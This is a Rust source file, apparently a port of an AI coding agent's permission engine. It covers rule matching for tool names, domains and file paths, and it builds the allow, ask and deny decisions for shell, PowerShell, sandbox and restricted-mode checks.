    if rule_tool_name == tool_name {
        return true;
    }
    // Whole-name glob (`n&&UJe(toolName)&&bpi(toolName,i)`): applies to plain
    // AND MCP rule names that contain `*`.
    if glob && rule_tool_name.contains('*') && glob_name_matches(rule_tool_name, tool_name) {
        return true;
    }
    let (Some(rule_info), Some(tool_info)) = (
        mcp_info_from_string(rule_tool_name),
        mcp_info_from_string(tool_name),
    ) else {
        return false;
    };
    if rule_info.server_name != tool_info.server_name {
        return false;
    }
    match rule_info.tool_name {
        None | Some("*") => true,
        Some(rule_tool_part) => {
            // MCP tool-part glob (`a.toolName!==void 0&&UJe(s.toolName)&&bpi(s.toolName,a.toolName)`).
            glob && rule_tool_part.contains('*')
                && tool_info
                    .tool_name
                    .is_some_and(|tool_part| glob_name_matches(rule_tool_part, tool_part))
        }
    }
}

/// Whether a rule's tool-wide name match should use glob semantics — `true` for
/// DENY and ASK rules (claude-code `h8`/`kqe` pass `globMatching:!0`), `false`
/// for ALLOW rules (`nes` uses default opts). Keyed off the rule's behavior
/// bucket, which is exactly the walk it participates in.
#[must_use]
fn rule_uses_glob(rule: &PermissionRule) -> bool {
    matches!(
        rule.behavior,
        PermissionBehavior::Deny | PermissionBehavior::Ask
    )
}

/// Split a `field:pattern` rule-content string on the FIRST `:` (claude-code
/// `Mjr`: `l=s.indexOf(":"); if(l<=0)continue`). Returns `(field, pattern)` with
/// both sides trimmed, or `None` when there is no `:`, the `:` is at position 0,
/// or either side is empty after trimming.
#[must_use]
fn split_field_pattern(content: &str) -> Option<(&str, &str)> {
    let idx = content.find(':')?;
    if idx == 0 {
        return None;
    }
    let field = content[..idx].trim();
    let pattern = content[idx + 1..].trim();
    if field.is_empty() || pattern.is_empty() {
        return None;
    }
    Some((field, pattern))
}

/// A tool's dedicated `ruleContentField` — 1:1 with claude-code's per-tool
/// declaration (`command` for Bash/PowerShell, `file_path` for Edit/Write,
/// `path` for Glob/Grep, `notebook_path` for NotebookEdit). The generic
/// `field:pattern` matcher SKIPS this field (those keep their dedicated
/// matchers). Any other tool has no dedicated field (`None`).
#[must_use]
fn tool_rule_content_field(tool_name: &str) -> Option<&'static str> {
    match tool_name {
        "Bash" | "PowerShell" => Some("command"),
        "Edit" | "Write" => Some("file_path"),
        "Glob" | "Grep" => Some("path"),
        "NotebookEdit" => Some("notebook_path"),
        _ => None,
    }
}

/// Stringify a JSON primitive for generic content matching — 1:1 with
/// claude-code `L1g`: strings pass through, numbers/booleans stringify, and any
/// non-primitive (null/array/object) yields `None` (no match).
#[must_use]
fn stringify_primitive(value: &serde_json::Value) -> Option<String> {
    match value {
        serde_json::Value::String(s) => Some(s.clone()),
        serde_json::Value::Number(n) => Some(n.to_string()),
        serde_json::Value::Bool(b) => Some(b.to_string()),
        serde_json::Value::Null | serde_json::Value::Array(_) | serde_json::Value::Object(_) => {
            None
        }
    }
}

/// claude-code `_pi(pattern, value)`: anchored, dotall glob where `*`→`.*` and
/// every other char is regex-escaped. Used for tool-name and content globbing.
#[must_use]
fn glob_name_matches(pattern: &str, value: &str) -> bool {
    match cached_glob_regex(pattern) {
        Some(re) => re.is_match(value),
        None => false,
    }
}

/// Compile+cache an anchored dotall `_pi` glob regex for `pattern`
/// (`^` + segments joined by `.*` + `$`, with `(?s)` for dotall).
fn cached_glob_regex(pattern: &str) -> Option<regex::Regex> {
    static CACHE: std::sync::OnceLock<Mutex<HashMap<String, Option<regex::Regex>>>> =
        std::sync::OnceLock::new();
    let cache = CACHE.get_or_init(|| Mutex::new(HashMap::new()));
    if let Some(hit) = cache.lock().unwrap().get(pattern) {
        return hit.clone();
    }
    let body: String = pattern
        .split('*')
        .map(regex::escape)
        .collect::<Vec<_>>()
        .join(".*");
    let compiled = regex::Regex::new(&format!("(?s)^{body}$")).ok();
    cache
        .lock()
        .unwrap()
        .insert(pattern.to_string(), compiled.clone());
    compiled
}

/// The tool-specific permission-rule CONTENT key derived from a tool call's
/// input, for the NON-file/NON-shell content tools (PERM.3). A content rule
/// matches iff its content string equals this key (claude-code per-tool
/// `…ToPermissionRuleContent` + `getRuleByContentsForTool(...).get(key)`).
///
/// - `WebFetch` → `domain:{hostname}` from `input.url`
///   (`WebFetchTool.ts:50-63`).
/// - `Agent` (and its legacy alias `Task`) → the `subagent_type`, defaulting to
///   `general-purpose` when omitted (claude-code `getDenyRuleForAgent`:
///   `ruleContent === agentType`, with the general-purpose default).
/// - any other tool → `None` (no content scheme ⇒ a content rule never matches).
fn tool_content_key(tool_name: &str, input: &serde_json::Value) -> Option<String> {
    match tool_name {
        "WebFetch" => {
            let url = input.get("url")?.as_str()?;
            Some(format!("domain:{}", url_hostname(url)?))
        }
        "Agent" | "Task" => {
            // TS resolves an omitted `subagent_type` to the general-purpose
            // agent's type before matching deny rules.
            let agent_type = input
                .get("subagent_type")
                .and_then(serde_json::Value::as_str)
                .unwrap_or("general-purpose");
            Some(agent_type.to_string())
        }
        // MOBILE DIVERGENCE: the first-party local-app host operations key on
        // their `app_id`, so `LocalAppBuild(app-a)` grants ONE app instead of
        // every app on the device. Without this the only expressible grant is
        // the tool-wide one — the exact limitation that moving these off
        // `mcp__local_apps__*` was meant to remove.
        //
        // Absent `app_id` yields `None`, i.e. a CONTENT rule never matches a
        // call that names no app. A tool-wide rule still matches either way.
        name if name.starts_with("LocalApp") => Some(
            input
                .get("app_id")
                .and_then(serde_json::Value::as_str)?
                .to_string(),
        ),
        _ => None,
    }
}

/// Extract the hostname from a URL string — the WHATWG `new URL(url).hostname`
/// claude-code uses to key `domain:${new URL(n).hostname}` rules (`_qa`,
/// offset ~201711761). Delegates to the `url` crate (the Rust WHATWG URL
/// parser): `Url::host_str()` reproduces `.hostname` exactly — it
/// Punycode/IDNA-encodes IDN hosts (`münchen.de` → `xn--mnchen-3ya.de`),
/// percent-decodes the host (`foo%2Ebar.com` → `foo.bar.com`), lowercases it,
/// strips userinfo/port/path/query/fragment, and preserves a bracketed IPv6
/// literal. Returns `None` when the URL fails to parse or carries no host
/// (1:1 with `new URL(...)` throwing / a hostless URL — `_qa` then keys no
/// `domain:` rule).
fn url_hostname(url: &str) -> Option<String> {
    url::Url::parse(url)
        .ok()
        .and_then(|u| u.host_str().map(str::to_string))
}

/// Whether a WebFetch `domain:` CONTENT-rule `pattern` matches the candidate
/// `domain:{host}` `key` — 1:1 with claude-code's per-rule `y$n` logic (#31):
/// raw exact hit, else normalized exact (non-wildcard) match, else `bRp`
/// wildcard match. (`y$n`'s exact-over-wildcard PRECEDENCE across a bucket is a
/// separate, finer nuance handled at the rule-walk level; this is the per-rule
/// predicate.)
/// Lift a plain boolean match into a [`RulePatternMatch`]. Only file-path rule
/// CONTENT carries gitignore negation, so every other rule kind is `Match` or
/// `NoMatch`.
fn kind(matched: bool) -> RulePatternMatch {
    if matched {
        RulePatternMatch::Match
    } else {
        RulePatternMatch::NoMatch
    }
}

/// Which rule of ONE settings source decides this call — claude-code's
/// per-source `ignore` matcher (`Zr`, `permissions.ts`), replayed rule by rule.
///
/// claude-code compiles all of a source's rules into a single `ignore` matcher
/// and reads back `{ignored, rule}`. npm `ignore` evaluates a pattern only when
/// it could FLIP the current state (`if (unignored === negative && ignored !==
/// unignored) return`), so:
///
/// - the first positive match wins and later positive patterns are skipped —
///   which is exactly the "first match in the source" walk this port already
///   did, so a rule set with no `!` behaves bit-for-bit as before;
/// - a `!`-negated pattern is evaluated only while the source is in the
///   "matched" state, and cancels it — the source then yields NOTHING and the
///   walk falls through to the next (lower-priority) source, so a negation
///   never reaches across settings sources;
/// - a positive pattern AFTER a negation can match again and re-establish the
///   decision.
///
/// `kind_of` is the per-rule test; rules it reports `NoMatch` for (wrong tool,
/// wrong tier, non-matching path) never touch the state.
///
/// ⚠️ Divergence, recorded rather than hidden: gitignore's "a file cannot be
/// re-included once a parent DIRECTORY is excluded" rule is a property of the
/// combined matcher. This port tests each pattern separately (each already via
/// `matched_path_or_any_parents`), so a `!` can re-include under an excluded
/// parent where upstream would not. That direction is permissive, and it only
/// fires for a rule set that spells both halves.
fn decide_in_source<'a>(
    rules: impl IntoIterator<Item = &'a PermissionRule>,
    mut kind_of: impl FnMut(&'a PermissionRule) -> RulePatternMatch,
) -> Option<&'a PermissionRule> {
    // `None` = nothing has matched yet; `Some(true)` = matched; `Some(false)` =
    // a negation cancelled the match (npm `ignore`'s `ignored`/`unignored` pair).
    let mut state: Option<bool> = None;
    let mut matched: Option<&'a PermissionRule> = None;
    for rule in rules {
        match kind_of(rule) {
            RulePatternMatch::NoMatch => {}
            RulePatternMatch::Match => {
                if state != Some(true) {
                    state = Some(true);
                    matched = Some(rule);
                }
            }
            RulePatternMatch::Negated => {
                if state != Some(false) {
                    state = Some(false);
                    matched = Some(rule);
                }
            }
        }
    }
    if state == Some(true) {
        matched
    } else {
        None
    }
}

fn domain_rule_matches(pattern: &str, key: &str) -> bool {
    if pattern == key {
        return true;
    }
    let np = normalize_domain_key(pattern);
    let nk = normalize_domain_key(key);
    if np.contains('*') {
        domain_wildcard_matches(&np, &nk)
    } else {
        np == nk
    }
}

/// Normalize a `domain:` rule string — claude-code `v$a`: lowercase the host and
/// strip a trailing run of dots (the `replace(/(?<=[^*.])\.+(?=(:\d+)?$)/,"")`).
/// Non-`domain:` strings are returned unchanged.
fn normalize_domain_key(s: &str) -> String {
    let Some(rest) = s.strip_prefix("domain:") else {
        return s.to_string();
    };
    let lower = rest.to_ascii_lowercase();
    // Split off an optional trailing `:port` (`:\d+$`) so dots are stripped from
    // the host body only (matching the `(?=(:\d+)?$)` lookahead).
    let (body, port) = match lower.rfind(':') {
        Some(i)
            if !lower[i + 1..].is_empty() && lower[i + 1..].bytes().all(|b| b.is_ascii_digit()) =>
        {
            (&lower[..i], &lower[i..])
        }
        _ => (lower.as_str(), ""),
    };
    let trimmed = body.trim_end_matches('.');
    // The lookbehind `(?<=[^*.])` requires the char before the dot-run to be
    // neither `*` nor `.` (and to exist); otherwise the dots are NOT stripped.
    let strip = trimmed.len() != body.len()
        && !matches!(trimmed.chars().next_back(), None | Some('*') | Some('.'));
    if strip {
        format!("domain:{trimmed}{port}")
    } else {
        format!("domain:{lower}")
    }
}

/// Whether wildcard `pattern` matches `candidate` (both normalized `domain:`
/// strings) — claude-code `bRp` + `w$a`. `domain:*` matches all; `domain:*.x`
/// matches one-or-more leading labels then `x`; a bare `*` becomes `[^.:]*`.
fn domain_wildcard_matches(pattern: &str, candidate: &str) -> bool {
    if !pattern.starts_with("domain:") || !candidate.starts_with("domain:") {
        return false;
    }
    if pattern == "domain:*" {
        return true;
    }
    let regex_str = if let Some(suffix) = pattern.strip_prefix("domain:*.") {
        format!("^domain:(?:[^.:]+\\.)+{}$", escape_domain_wildcard(suffix))
    } else {
        let rest = &pattern["domain:".len()..];
        format!("^domain:{}$", escape_domain_wildcard(rest))
    };
    // `(?i)` mirrors `bRp`'s `new RegExp(n, "i")` (inputs are already lowercased).
    cached_domain_regex(&format!("(?i){regex_str}")).is_some_and(|re| re.is_match(candidate))
}

fn cached_domain_regex(pattern: &str) -> Option<regex::Regex> {
    static CACHE: std::sync::OnceLock<Mutex<HashMap<String, Option<regex::Regex>>>> =
        std::sync::OnceLock::new();
    let cache = CACHE.get_or_init(|| Mutex::new(HashMap::new()));
    if let Some(cached) = cache
        .lock()
        .expect("domain regex cache")
        .get(pattern)
        .cloned()
    {
        return cached;
    }
    let compiled = regex::Regex::new(pattern).ok();
    cache
        .lock()
        .expect("domain regex cache")
        .insert(pattern.to_string(), compiled.clone());
    compiled
}

/// Escape regex metacharacters and turn each `*` into `[^.:]*` — claude-code
/// `w$a` (`split("*").map(escape).join("[^.:]*")`).
fn escape_domain_wildcard(s: &str) -> String {
    s.split('*')
        .map(regex::escape)
        .collect::<Vec<_>>()
        .join("[^.:]*")
}

/// Byte-locked sed-constraint ask: an `acceptEdits` `sed` subcommand whose
/// auto-allow verdict is `Unsafe` (claude-code `checkSedConstraints` returning
/// `behavior: 'ask'`, `sedValidation.ts:665-675`). Tagged
/// [`PermissionDecisionReason::Other`] (TS `decisionReason.type: 'other'`),
/// carrying the byte-locked message + reason.
fn ask_sed_constraint(message: String, reason: String) -> PermissionResult {
    PermissionResult::Ask {
        reason: PermissionDecisionReason::Other { reason },
        prompt: PermissionPrompt {
            title: "Allow Bash?".to_string(),
            message,
            options: vec!["Allow once".into(), "Deny".into()],
        },
        pending_classifier_check: None,
        metadata: PermissionMetadata::default(),
    }
}

// .270 tBn preserves nested shell safety/plan objections ahead of an outer
// Monitor allow rule (K_ recursively checks subcommandResults).
fn monitor_ask_requires_confirmation(result: &PermissionResult) -> bool {
    let PermissionResult::Ask { reason, .. } = result else {
        return false;
    };
    match reason {
        PermissionDecisionReason::SafetyCheck { .. }
        | PermissionDecisionReason::SandboxOverride { .. }
        | PermissionDecisionReason::PermissionMode {
            mode: PermissionMode::Plan,
        } => true,
        PermissionDecisionReason::SubcommandResults { reasons } => reasons
            .values()
            .any(|result| monitor_ask_requires_confirmation(result)),
        _ => false,
    }
}

fn allow_with_rule(rule: &PermissionRule) -> PermissionResult {
    PermissionResult::Allow {
        reason: PermissionDecisionReason::MatchedRule { rule: rule.clone() },
        updated_input: None,
        update_destination: None,
        metadata: PermissionMetadata::default(),
    }
}

fn deny_with_rule(rule: &PermissionRule) -> PermissionResult {
    PermissionResult::Deny {
        reason: PermissionDecisionReason::MatchedRule { rule: rule.clone() },
        explanation: None,
        metadata: PermissionMetadata::default(),
    }
}

/// Deny from a CONTENT (command-specific) rule match. For the command tools
/// (`Bash` / `PowerShell`) this carries the command in the model-facing message,
/// 1:1 with `bashPermissions.ts:1003` / `powershellPermissions.ts:396`:
/// `Permission to use ${tool} with command ${command} has been denied.`
/// (`command = input.command.trim()`). Other tools — and the TOOL-WIDE deny path
/// (`permissions.ts:1087`) — use the generic `deny_reason_string` message via an
/// absent `explanation`.
fn deny_with_rule_content(
    rule: &PermissionRule,
    tool_name: &str,
    input: &serde_json::Value,
) -> PermissionResult {
    let explanation = if tool_name == "Bash" || tool_name == "PowerShell" {
        input
            .get("command")
            .and_then(serde_json::Value::as_str)
            .map(|cmd| {
                format!(
                    "Permission to use {tool_name} with command {} has been denied.",
                    cmd.trim()
                )
            })
    } else {
        // Generic CONTENT deny (binary `uMe`/`mZt`: `Permission to use ${e.name}
        // with ${s.ruleValue.ruleContent} has been denied.`, od -c @215384392).
        // Non-shell tools with a dedicated content rule (e.g. `WebFetch(domain:…)`,
        // `Agent(type)`) surface the matched `ruleContent`; a tool-wide rule
        // (`rule_content == None`) falls through to the bare generic message.
        rule.value
            .rule_content
            .as_deref()
            .map(|content| format!("Permission to use {tool_name} with {content} has been denied."))
    };
    PermissionResult::Deny {
        reason: PermissionDecisionReason::MatchedRule { rule: rule.clone() },
        explanation,
        metadata: PermissionMetadata::default(),
    }
}

fn allow_with_mode(mode: PermissionMode) -> PermissionResult {
    PermissionResult::Allow {
        reason: PermissionDecisionReason::PermissionMode { mode },
        updated_input: None,
        update_destination: None,
        metadata: PermissionMetadata::default(),
    }
}

/// Sandbox auto-allow grant (claude-code `checkSandboxAutoAllow`'s final
/// `behavior: 'allow'`, `decisionReason: { type: 'other', reason: 'Auto-allowed
/// with sandbox (autoAllowBashIfSandboxed enabled)' }`). Tagged
/// [`PermissionDecisionReason::Other`] carrying the byte-faithful reason (TS
/// uses `type: 'other'` here, NOT a sandbox-specific reason — preserved so the
/// existing `SandboxOverrideReason` enum is untouched).
/// The plan-file carve-out allow — `Oe(n, …)` in 2.1.266 `LZe` (write) and the
/// read resolver, whose reasons are byte-locked in [`crate::plan_files`].
fn allow_plan_file(writing: bool) -> PermissionResult {
    PermissionResult::Allow {
        reason: PermissionDecisionReason::Other {
            reason: if writing {
                crate::plan_files::PLAN_FILE_WRITE_ALLOW_REASON.to_string()
            } else {
                crate::plan_files::PLAN_FILE_READ_ALLOW_REASON.to_string()
            },
        },
        updated_input: None,
        update_destination: None,
        metadata: PermissionMetadata::default(),
    }
}

fn allow_sandbox_auto() -> PermissionResult {
    PermissionResult::Allow {
        reason: PermissionDecisionReason::Other {
            reason: "Auto-allowed with sandbox (autoAllowBashIfSandboxed enabled)".to_string(),
        },
        updated_input: None,
        update_destination: None,
        metadata: PermissionMetadata::default(),
    }
}

/// Read-only command auto-allow (claude-code `bashToolHasPermission` step 7,
/// `behavior: 'allow'`, `decisionReason: { type: 'other', reason: 'Read-only
/// command is allowed' }`). Tagged [`PermissionDecisionReason::Other`] carrying
/// the byte-faithful reason.
fn allow_read_only() -> PermissionResult {
    PermissionResult::Allow {
        reason: PermissionDecisionReason::Other {
            reason: "Read-only command is allowed".to_string(),
        },
        updated_input: None,
        update_destination: None,
        metadata: PermissionMetadata::default(),
    }
}

/// Compound-command allow grant (claude-code `bashToolHasPermission`'s
/// `subcommandPermissionDecisions.every(_ => _.behavior === 'allow')` branch,
/// `bashPermissions.ts:2368-2385`, `decisionReason: { type:
/// 'subcommandResults', … }`). The port has no `subcommandResults` decision
/// reason, so this is tagged [`PermissionDecisionReason::Other`] with a
/// descriptive reason — functionally irrelevant to the gate, which maps every
/// `Allow` to `Allow` regardless of reason.
fn allow_compound() -> PermissionResult {
    PermissionResult::Allow {
        reason: PermissionDecisionReason::Other {
            reason: "All subcommands are allowed".to_string(),
        },
        updated_input: None,
        update_destination: None,
        metadata: PermissionMetadata::default(),
    }
}

impl PermissionPolicy {
    /// `bashCommandClamp` deny for THIS call, or `None` when no clamp is attached
    /// (the default) or the call satisfies every clamp group.
    ///
    /// Reproduces the three oracle `checkPermissions` clamp arms:
    ///
    /// * `M8n` (@290160634) — the Bash arm: `hSv` decomposes the command and
    ///   every clamp group must admit every span; a miss denies with the
    ///   byte-locked span/allowed-forms message.
    /// * `Wfm` (@294394648) — PowerShell: denied outright, no command inspection.
    /// * `Jkf` (@292829969) — the `Monitor{ws}` arm: a WebSocket is not a Bash
    ///   command form, so it is denied outright too. (A COMMAND-monitor never
    ///   reaches this arm: `authorize_with_mode_and_workspace_lease` already
    ///   rewrites its effective tool name to `Bash`, matching the oracle's
    ///   `return Lon({...e,command:e.command},t)`.)
    ///
    /// The mobile `Shell` tool is treated as Bash: it is a Bash-command surface
    /// ([`crate::shell_command::is_shell_tool`]) and carries the same
    /// `Bash(...)`-shaped content rules the clamp groups are written in.
    fn bash_command_clamp_deny(
        &self,
        tool_name: &str,
        input: &serde_json::Value,
    ) -> Option<PermissionResult> {
        if self.bash_command_clamps.is_empty() {
            return None;
        }
        let no_match = || PermissionDecisionReason::Other {
            reason: crate::bash_command_clamp::CLAMP_NO_MATCH_REASON.to_string(),
        };
        // `Wfm` — PowerShell can never match a Bash command form.
        if tool_name == "PowerShell" {
            return Some(PermissionResult::Deny {
                reason: no_match(),
                explanation: Some(
                    crate::bash_command_clamp::POWERSHELL_CLAMP_DENY_MESSAGE.to_string(),
                ),
                metadata: PermissionMetadata::default(),
            });
        }
        // `Jkf("Monitor websocket", …)` — the ws arm of Monitor.
        if tool_name == "Monitor" && input.get("ws").is_some() {
            return Some(PermissionResult::Deny {
                reason: no_match(),
                explanation: Some(crate::bash_command_clamp::clamp_surface_deny_message(
                    crate::bash_command_clamp::MONITOR_WEBSOCKET_SURFACE,
                )),
                metadata: PermissionMetadata::default(),
            });
        }
        // `M8n` — the Bash-family arm.
        if shell_command::is_shell_tool(tool_name) {
            let command = shell_command::command_from_input(input)?;
            let miss =
                crate::bash_command_clamp::find_clamp_miss(command, &self.bash_command_clamps)?;
            return Some(PermissionResult::Deny {
                reason: no_match(),
                explanation: Some(crate::bash_command_clamp::clamp_bash_deny_message(
                    tool_name, command, &miss,
                )),
                metadata: PermissionMetadata::default(),
            });
        }
        // Every other tool is untouched: only the three surfaces above declare a
        // clamp-aware `checkPermissions` upstream.
        None
    }
}

fn deny_with_mode(mode: PermissionMode) -> PermissionResult {
    PermissionResult::Deny {
        reason: PermissionDecisionReason::PermissionMode { mode },
        explanation: None,
        metadata: PermissionMetadata::default(),
    }
}

/// Construct the restricted-mode approval request for a protected mutation.
/// Keeping this as a safety-check reason ensures hook re-checks and transport
/// metadata follow the existing protected-ask path instead of inventing a
/// second bypass/allow mechanism.
fn ask_for_restricted_protected_mutation(
    tool_name: &str,
    input: &serde_json::Value,
) -> PermissionResult {
    let target = input
        .get("file_path")
        .or_else(|| input.get("notebook_path"))
        .or_else(|| input.get("setting"))
        .and_then(serde_json::Value::as_str)
        .unwrap_or(tool_name);
    let reason = format!(
        "Restricted mode requires a person or configured permission handler to approve writes to settings, git, and tool-configuration files ({target})."
    );
    PermissionResult::Ask {
        reason: PermissionDecisionReason::SafetyCheck {
            reason: reason.clone(),
            classifier_approvable: false,
            circuit_breaker: None,
        },
        prompt: PermissionPrompt {
            title: "Restricted mode approval".to_string(),
            message: reason,
            options: Vec::new(),
        },
        pending_classifier_check: None,
        metadata: PermissionMetadata::default(),
    }
}

fn deny_workspace_host_owned(tool_name: &str) -> PermissionResult {
    PermissionResult::Deny {
        reason: PermissionDecisionReason::Other {
            reason: format!("{tool_name} is outside the local-app source editing boundary"),
        },
        explanation: Some(
            "Local-app writes must use structured file tools; host-managed build files and non-inspection shell commands are protected."
                .to_string(),
        ),
        metadata: PermissionMetadata::default(),
    }
}

fn deny_workspace_outside(tool_name: &str) -> PermissionResult {
    PermissionResult::Deny {
        reason: PermissionDecisionReason::Other {
            reason: format!("{tool_name} path escapes the local-app workspace"),
        },
        explanation: Some(
            "Local-app workspace operations cannot follow paths outside the canonical workspace."
                .to_string(),
        ),
        metadata: PermissionMetadata::default(),
    }
}

fn ask_with_rule(rule: &PermissionRule, tool_name: &str) -> PermissionResult {
    PermissionResult::Ask {
        reason: PermissionDecisionReason::MatchedRule { rule: rule.clone() },
        prompt: PermissionPrompt {
            title: format!("Allow {tool_name}?"),
            // `createPermissionRequestMessage` rule branch (permissions.ts:163):
            // `Permission rule '${rule}' from ${source} requires approval for
            // this ${tool} command`.
            message: format!(
                "Permission rule '{}' from {} requires approval for this {tool_name} command",
                rule.value.to_rule_string(),
                crate::shadow::format_source(rule.source)
            ),
            options: vec!["Allow once".into(), "Always allow".into(), "Deny".into()],
        },
        pending_classifier_check: None,
        // The oracle's `_pt` plain ask-rule arm returns
        // `{behavior:"ask", decisionReason:{type:"rule",rule}, message:Lh(name)}`
        // with NO `permission_suggestions`; the previously-attached
        // `addRules/allow/session` suggestion was both invented and inert (an
        // applied session allow did not actually suppress the ask). Removed for
        // byte parity — the metadata plumbing stays for genuine per-tool
        // producers.
        metadata: PermissionMetadata::default(),
    }
}

fn ask_with_mode(mode: PermissionMode, tool_name: &str) -> PermissionResult {
    PermissionResult::Ask {
        reason: PermissionDecisionReason::PermissionMode { mode },
        prompt: PermissionPrompt {
            title: format!("Allow {tool_name}?"),
            // `createPermissionRequestMessage` mode branch (permissions.ts:200):
            // `Current permission mode (${modeTitle}) requires approval for this
            // ${tool} command`.
            message: format!(
                "Current permission mode ({}) requires approval for this {tool_name} command",
                mode.title()
            ),
            options: vec!["Allow once".into(), "Always allow".into(), "Deny".into()],
        },
        pending_classifier_check: None,
        metadata: PermissionMetadata::default(),
    }
}

/// Dangerous-removal ask: an `rm`/`rmdir` targeting a critical system path
/// (claude-code `checkDangerousRemovalPaths` → `yqe`). Tagged with
/// [`PermissionDecisionReason::SafetyCheck`] `{ classifier_approvable: false }`
/// (REASON-01) — the TS `yqe` sets `decisionReason:{type:"safetyCheck",reason:
/// `Dangerous ${cmd} operation ${detail}`,classifierApprovable:!1}`. The
/// safetyCheck tag is LOAD-BEARING: the bypass carve-out (`Are` + the
/// "Dangerous rm/rmdir operation" reason prefix) inspects ONLY safetyCheck
/// reasons, so this ask survives bypassPermissions while every type-`other`
/// guard ask is overridden. `danger.reason` already carries the
/// `Dangerous {rm,rmdir} operation …` prefix. Offers no rule-saving suggestion
/// (TS: "Don't provide suggestions — we don't want to encourage saving
/// dangerous commands").
fn ask_dangerous_removal(
    tool_name: &str,
    danger: crate::dangerous_removal::DangerousRemoval,
) -> PermissionResult {
    PermissionResult::Ask {
        reason: PermissionDecisionReason::SafetyCheck {
            reason: danger.reason,
            classifier_approvable: false,
            // PARITY oracle `HL`: `circuitBreaker:"dangerousRemoval"`.
            circuit_breaker: Some(crate::result::SafetyCircuitBreaker::DangerousRemoval),
        },
        prompt: PermissionPrompt {
            title: format!("Allow {tool_name}?"),
            message: danger.message,
            options: vec!["Allow once".into(), "Deny".into()],
        },
        pending_classifier_check: None,
        metadata: PermissionMetadata::default(),
    }
}

/// Bash path-constraint ask: a command writing/`cd`-ing/process-substituting
/// outside the allowed working dirs (claude-code `checkPathConstraints`). Tagged
/// with [`PermissionDecisionReason::Other`] (the TS `decisionReason.type:
/// 'other'`), carrying the byte-locked message. Offers no rule-saving
/// suggestion (the TS suggestions are a UI concern modeled elsewhere; the
/// permission-layer decision is the ask itself).
/// Map a PowerShell containment ASK to a permission prompt (mirrors
/// [`ask_path_constraint`]; the message is byte-faithful to claude-code).
fn ask_powershell_containment(message: String, reason: String) -> PermissionResult {
    PermissionResult::Ask {
        reason: PermissionDecisionReason::Other { reason },
        prompt: PermissionPrompt {
            title: "Allow PowerShell?".to_string(),
            message,
            options: vec!["Allow once".into(), "Deny".into()],
        },
        pending_classifier_check: None,
        metadata: PermissionMetadata::default(),
    }
}

fn ask_powershell_invalid_parse(signal: String) -> PermissionResult {
    let message = format!("PowerShell command could not be statically validated: {signal}");
    PermissionResult::Ask {
        reason: PermissionDecisionReason::Other { reason: signal },
        prompt: PermissionPrompt {
            title: "Allow PowerShell?".to_string(),
            message,
            options: vec!["Allow once".into(), "Deny".into()],
        },
        pending_classifier_check: None,
        metadata: PermissionMetadata::default(),
    }
}

/// Map a PowerShell containment DENY (a `Remove-Item` protected-path hit, `Hwt`)
/// to a permission deny.
fn deny_powershell_containment(message: String, reason: String) -> PermissionResult {
    PermissionResult::Deny {
        reason: PermissionDecisionReason::Other { reason },
        explanation: Some(message),
        metadata: PermissionMetadata::default(),
    }
}

fn ask_path_constraint(
    tool_name: &str,
    ask: crate::path_constraints::PathConstraintAsk,
) -> PermissionResult {
    let crate::path_constraints::PathConstraintAsk {
        message,
        reason,
        blocked_path,
        outside_reads_blocked,
    } = ask;
    // PARITY `ppo`: the read block's refusal keeps `PE`'s own decisionReason —
    // the `outsideReadsBlocked` safetyCheck — instead of the ordinary
    // path-constraint `type:"other"`.
    let decision_reason = if outside_reads_blocked {
        PermissionDecisionReason::SafetyCheck {
            reason,
            classifier_approvable: false,
            circuit_breaker: Some(crate::result::SafetyCircuitBreaker::OutsideReadsBlocked),
        }
    } else {
        PermissionDecisionReason::Other { reason }
    };
    PermissionResult::Ask {
        reason: decision_reason,
        prompt: PermissionPrompt {
            title: format!("Allow {tool_name}?"),
            message,
            options: vec!["Allow once".into(), "Deny".into()],
        },
        pending_classifier_check: None,
        metadata: PermissionMetadata {
            blocked_path,
            ..PermissionMetadata::default()
        },
    }
}

/// Bash command-injection safety ask: a shell command whose
/// [`crate::bash_security::bash_command_is_safe`] battery returned a detection
/// (claude-code `bashCommandIsSafe` → `checkCommandAndSuggestRules` step 3
/// returning `behavior: 'ask'`, `bashPermissions.ts:1223-1237`). Tagged
/// [`PermissionDecisionReason::Other`] (REASON-01) — the TS battery asks are
/// `decisionReason:{type:"other",reason:…,bashMissKind:…}`, NOT safetyCheck. The
/// `other` tag is load-bearing: a tool-wide allow rule overrides these asks
/// (`nes`, ALLOWOVER-01) and bypassPermissions suppresses them, whereas the
/// safetyCheck-tagged dangerous-removal asks are NOT overridable. No rule-saving
/// suggestion (TS: "Don't suggest saving a potentially dangerous command",
/// `:1236`).
fn ask_bash_safety(tool_name: &str, message: String) -> PermissionResult {
    PermissionResult::Ask {
        reason: PermissionDecisionReason::Other {
            reason: message.clone(),
        },
        prompt: PermissionPrompt {
            title: format!("Allow {tool_name}?"),
            message,
            options: vec!["Allow once".into(), "Deny".into()],
        },
        pending_classifier_check: None,
        metadata: PermissionMetadata::default(),
    }
}

/// PS-CD-03 `P5r(name)`: is a PowerShell command element a `cd`-like directory
/// change? `true` for the literal `cd..`/`cd\`/`cd/`/`cd~` forms and a bare drive
/// letter (`/^[a-z]:$/`), or a name that normalizes
/// ([`crate::powershell_containment::normalize_cmdlet`], `D_`) to
/// `set-location`/`push-location`/`pop-location`/`new-psdrive` (plus the Windows
/// `ndr`/`mount` aliases).
fn ps_element_is_cd_like(name: &str) -> bool {
    let t = name.to_lowercase();
    if matches!(t.as_str(), "cd.." | "cd\\" | "cd/" | "cd~") {
        return true;
    }
    // `/^[a-z]:$/` — a bare drive letter such as `c:`.
    let b = t.as_bytes();
    if b.len() == 2 && b[0].is_ascii_lowercase() && b[1] == b':' {
        return true;
    }
    let r = crate::powershell_containment::normalize_cmdlet(name);
    matches!(
        r.as_str(),
        "set-location" | "push-location" | "pop-location" | "new-psdrive"
    ) || (cfg!(target_os = "windows") && matches!(r.as_str(), "ndr" | "mount"))
}

/// EDIT-READDENY-02 ask: the Edit target is covered by a Read deny rule
/// (claude-code `CZn` → validateInput `{result:!1,behavior:"ask",message:eLi,
/// errorCode:13}`). Tagged [`PermissionDecisionReason::Other`] carrying the
/// byte-locked `eLi` message.
///
/// PERM-01 (claude-code 2.1.238): the message is now split by tool. 2.1.238
/// defines the pair side by side (cc-238.js @283747794)
/// `ssa="File is covered by a Read deny rule in your permission settings and
/// cannot be edited.",asa="…and cannot be written."`; `Write` is the ONLY
/// consumer of `asa` (validateInput `{result:!1,message:asa,errorCode:13}` and
/// the `call`-phase `throw new Q4e(asa)`), while Edit/MultiEdit/NotebookEdit
/// keep `ssa`. The `asa` spelling has 0 hits in 2.1.220, so this is new drift.
